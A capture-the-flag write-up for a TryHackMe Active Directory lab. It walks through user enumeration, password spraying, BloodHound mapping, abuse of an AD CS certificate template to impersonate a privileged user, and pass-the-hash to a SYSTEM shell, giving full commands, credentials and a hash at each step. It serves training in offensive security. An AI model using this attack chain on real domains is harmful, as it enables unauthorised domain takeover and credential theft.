### 📄 THM: [Machine Name: ledger]

**Challenge Details**

- **Category:** [[CyberSecurity]], [[Active Directory]], [[Privilege Escalation]]
    
- **Difficulty:** Medium
    
- **Target:** LABYRINTH
    
- **Status:** #solved
    
- **Date Completed:** [[2025-08-29]]
    

---

### 🎯 Objective

This write-up documents the methodology used to compromise the `LABYRINTH` machine, an Active Directory environment. The process involved enumerating users to find a reusable password, which was then leveraged to perform an **Active Directory Certificate Services (AD CS)** attack. This attack granted a highly privileged user's NTLM hash, leading to a `SYSTEM` shell on the domain controller.

---

### 🕵️ Reconnaissance & Initial Access

The initial phase involved a full port scan to identify open services on the target.

Bash

```
nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN nmap_vuln.txt
```

The scans revealed that **SMB (445)** and **LDAP (389)** ports were open, confirming a Windows Active Directory environment. I used `netexec` to perform a null authentication against the target. The results confirmed the domain and hostname: `LABYRINTH` in the `thm.local` domain.

Using a null session, I performed a **RID brute-force** to enumerate a list of 493 valid users.

Bash

```
netexec smb $target -u '' -p '' --rid-brute | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '\' -f2 | tee userlist2.txt
```

Further enumeration with `netexec ldap` revealed user comments that contained a clear text password policy message for some users.

Bash

```
netexec ldap $target -u '' -p '' --users | grep -v 'Tier 1 User'
```

The output revealed an interesting comment for users like `SUSANNA_MCKNIGHT`: `Please change it: CHANGEME2023!`. This indicated a likely password policy and a shared default password.

I performed a **password spray** on all the enumerated users using the discovered password, `CHANGEME2023!`, against various services including SMB, LDAP, RDP, WMI, and WinRM. This attempt was unsuccessful.

I then tried to perform a **Kerberoasting** attack with the found credentials but had no luck. I also tried **ASRepRoasting**, which yielded 5 hashes, but they could not be cracked even after using several large wordlists.

---

### 🦮 Privilege Escalation via BloodHound & Certipy

Given the dead ends, I turned to **BloodHound** to map the Active Directory environment and identify a clear path to privilege escalation. I ran the BloodHound ingestor to collect data on users, groups, and permissions.

Started Bloodhound:

```bash
curl -L https://ghst.ly/getbhce -o docker-compose.yml
sudo docker-compose pull && sudo docker-compose up -d
sudo docker-compose logs bloodhound | grep -i passw
```

```
netexec ldap $target -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!' --bloodhound --collection All --dns-server $target
```

I loaded the resulting `bloodhound.zip` file into the BloodHound GUI. The graph visualization quickly showed that the `LABYRINTH` domain had **Active Directory Certificate Services (AD CS)** misconfigurations. Specifically, a vulnerable certificate template was identified that could be abused for privilege escalation.

I used **Certipy-ad**, a tool for AD CS enumeration and exploitation, to request a certificate for a highly privileged user, **BRADLEY_ORTIZ**, by authenticating as `SUSANNA_MCKNIGHT` and abusing the vulnerable certificate template.
ca
```Bash
certipy-ad find -u username@domain -p 'password' -target $target -vulnerable
```
I ran cat on the output file from this and it had all the template information I needed to send in a request for Bradley_Oritz

```
certipy-ad req \
-u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!' \
-dc-ip $target -target 'labyrinth.thm.local' \
-ca 'thm-LABYRINTH-CA' -template 'ServerAuth' \
-upn 'BRADLEY_ORTIZ@thm.local'
```

This command successfully requested a certificate and saved it as a `.pfx` file, containing the certificate for `BRADLEY_ORTIZ`.

---

### 🔑 Gaining a Root Shell

The `.pfx` file was then used with `Certipy-ad` to perform a **Pass-the-Certificate** attack, which allowed me to retrieve the NTLM hash of **BRADLEY_ORTIZ**.

Bash

```
certipy-ad auth -pfx bradley_ortiz.pfx -dc-ip $target
```

**Results:** The tool successfully authenticated and returned the NTLM hash for `BRADLEY_ORTIZ`: `aad3b435b51404eeaad3b435b51404ee:16ec31963c93240962b7e60fd97b495d`.

I then used **impacket-psexec** with the retrieved NTLM hash to gain a shell with `NT AUTHORITY\SYSTEM` privileges, as the `psexec` utility leverages the hash to authenticate and execute a process as a service.

Bash

```
impacket-psexec bradley_ortiz@$target -hashes :16ec31963c93240962b7e60fd97b495d
```

**Shell Output:**

```
C:\Windows\system32> whoami
nt authority\system
```
